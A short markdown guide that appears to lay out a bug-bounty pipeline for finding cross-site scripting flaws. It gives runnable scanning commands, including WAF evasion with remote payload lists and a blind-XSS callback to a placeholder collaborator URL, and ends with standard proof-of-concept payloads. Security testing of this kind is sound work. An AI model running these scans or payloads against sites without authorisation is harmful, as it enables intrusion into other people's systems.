# XSS Detection Pipeline

> **Tip:** Use `setup_audit.sh` to generate the `target` file.

## 1. Identify Candidates
Filter URLs that reflect input.

```bash
# KXSS (Find reflected parameters)
cat live_urls.txt | kxss > reflected_params.txt

# GF XSS
gf xss < live_urls.txt > xss_candidates.txt
```

## 2. Reflected XSS Scanning (Dalfox)
Use Dalfox for advanced XSS scanning.

### Basic Mining
Fast scan using built-in payloads.
```bash
dalfox file xss_candidates.txt --mining-dict -o scans/dalfox_mining.txt
```

### Deep Scan & DOM XSS
More thorough scan, including DOM analysis.
```bash
cat reflected_params.txt | awk '{print $9}' | dalfox pipe --deep-domxss --multicast -o scans/dalfox_verified.txt
```

### WAF Evasion
Bypass firewalls using evasion techniques and remote payloads.
```bash
dalfox file xss_candidates.txt --waf-evasion --remote-payloads=portswigger,payloadbox -o scans/dalfox_waf.txt
```

### Blind XSS
Integrate with a callback server (e.g., Burp Collaborator, Interactsh).
```bash
# Replace with your callback URL
export CALLBACK_URL="https://your-collaborator-url.com"
dalfox file xss_candidates.txt --blind $CALLBACK_URL -o scans/dalfox_blind.txt
```

### Custom Payloads
Use your own list of payloads for targeted testing.
```bash
dalfox file xss_candidates.txt --custom-payload my_payloads.txt -o scans/dalfox_custom.txt
```

## 3. Prototype Pollution
Scan for client-side prototype pollution vulnerabilities.

```bash
# PPFuzz
cat live_urls.txt | ppfuzz -p 10 -o scans/ppfuzz_results.txt
```

## 4. DOM XSS (Nuclei)
Scan for DOM-based vulnerabilities using templates.

```bash
nuclei -l live_urls.txt -tags headless,dom -o scans/nuclei_dom.txt
```

## 5. Manual Verification
Always verify automated findings manually.
- Check context (HTML, Attribute, JS).
- Try standard payloads: `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`.
- Check for WAFs and try bypasses.